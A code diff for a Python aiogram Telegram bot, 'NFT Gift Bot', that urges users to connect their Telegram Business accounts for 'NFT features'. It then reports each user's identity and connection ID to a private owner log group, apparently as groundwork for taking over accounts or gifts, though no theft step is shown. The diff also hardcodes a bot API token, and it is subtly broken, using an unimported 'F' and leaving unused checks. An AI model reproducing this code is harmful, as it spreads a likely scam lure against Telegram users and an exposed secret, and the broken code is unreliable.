@@ -3,10 +3,15 @@ import logging
 from aiogram import Bot, Dispatcher, types
 from aiogram.enums import ParseMode
 from aiogram.filters import Command
+from aiogram.types import (
+    Message,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    BusinessConnection
+)
 from aiogram.methods import GetBusinessConnection
 from aiogram.exceptions import TelegramAPIError
 
-# Configuration
 API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
 LOG_GROUP_ID = -1002710995756
 OWNER_ID = 7072373613
@@ -15,67 +20,83 @@ OWNER_ID = 7072373613
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
-async def fetch_nft_gifts_from_api(business_connection_id: str):
-    """Fetch NFT gifts using direct API request"""
+async def log_connection(user: types.User, connection_id: str):
+    """Log connection details to admin group"""
     try:
-        # In production, replace this with:
-        # 1. Direct Telegram API call using aiohttp
-        # 2. Or blockchain integration (Web3, Moralis, etc.)
-        # For now returns empty list since method isn't available
-        return []
-        
-    except Exception as e:
-        logging.error(f"API Error: {e}")
-        return []
-
-async def log_connection_with_gifts(user: types.User, connection_id: str):
-    """Log connection and attempt to fetch gifts"""
-    try:
-        # Get business connection details
-        connection = await bot(GetBusinessConnection(
-            business_connection_id=connection_id
-        ))
-        
-        # Try to fetch NFT gifts
-        nft_gifts = await fetch_nft_gifts_from_api(connection_id)
-        
-        # Prepare log message
-        gift_info = "\n".join(
-            f"• {gift['name']}" 
-            for gift in nft_gifts[:3]  # Show first 3 if available
-        ) if nft_gifts else "No NFT gifts found"
-        
         await bot.send_message(
             chat_id=LOG_GROUP_ID,
-            text=f"🎁 <b>Business Connection</b>\n\n"
+            text=f"🆕 <b>Business Connection Established</b>\n\n"
                  f"👤 User: {user.mention_html()}\n"
-                 f"🔗 Connection ID: <code>{connection_id}</code>\n\n"
-                 f"🖼 <b>NFT Gifts:</b>\n{gift_info}",
+                 f"🆔 ID: <code>{user.id}</code>\n"
+                 f"🔗 Connection ID: <code>{connection_id}</code>",
             parse_mode=ParseMode.HTML
         )
-        
-    except TelegramAPIError as e:
-        logging.error(f"Connection error: {e}")
+    except Exception as e:
+        logging.error(f"Failed to log connection: {e}")
+
+@dp.message(Command("start"))
+async def start_command(message: types.Message):
+    """Handle /start command"""
+    try:
+        # Check if it's a business connection
+        if hasattr(message, 'business_connection_id'):
+            connection_id = message.business_connection_id
+            await message.reply("🟢 Connected via Business!")
+            await log_connection(message.from_user, connection_id)
+        else:
+            await message.reply(
+                "Please connect via Telegram Business to access NFT features",
+                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                    [InlineKeyboardButton(
+                        text="Connect Business Account",
+                        callback_data="business_connect"
+                    )]
+                ])
+            )
+    except Exception as e:
+        logging.error(f"Start command error: {e}")
+        await message.reply("❌ Error processing your request")
+
+@dp.callback_query(F.data == "business_connect")
+async def business_connect_callback(callback: types.CallbackQuery):
+    """Handle business connection button"""
+    try:
+        await callback.answer()
+        await callback.message.edit_text(
+            "Please connect through Telegram Business settings"
+        )
+    except Exception as e:
+        logging.error(f"Callback error: {e}")
 
 @dp.business_connection()
-async def handle_business_connection(bc: types.BusinessConnection):
-    """Handle new business connections"""
+async def handle_business_connect(bc: BusinessConnection):
+    """Automatically handle new business connections"""
     try:
-        await log_connection_with_gifts(bc.user, bc.id)
+        # Get fresh connection info
+        connection = await bot(GetBusinessConnection(
+            business_connection_id=bc.id
+        ))
         
-        if bc.can_reply:
+        # Log the connection
+        await log_connection(bc.user, bc.id)
+        
+        # Send welcome message if allowed
+        if connection.can_reply:
             await bot.send_message(
                 chat_id=bc.user.id,
-                text="🌟 Welcome to NFT Gift Bot\n\n"
-                     "We'll fetch your NFT gifts when available",
+                text="🌟 Welcome to NFT Gift Bot!\n\n"
+                     "You've successfully connected your business account.\n"
+                     "Use /help to see available commands",
                 parse_mode=ParseMode.HTML
             )
-            
     except Exception as e:
-        logging.error(f"Error: {e}")
+        logging.error(f"Business connection error: {e}")
 
 async def main():
-    await dp.start_polling(bot)
+    try:
+        await dp.start_polling(bot)
+    except Exception as e:
+        logging.error(f"Bot startup error: {e}")
 
 if __name__ == "__main__":
     logging.basicConfig(
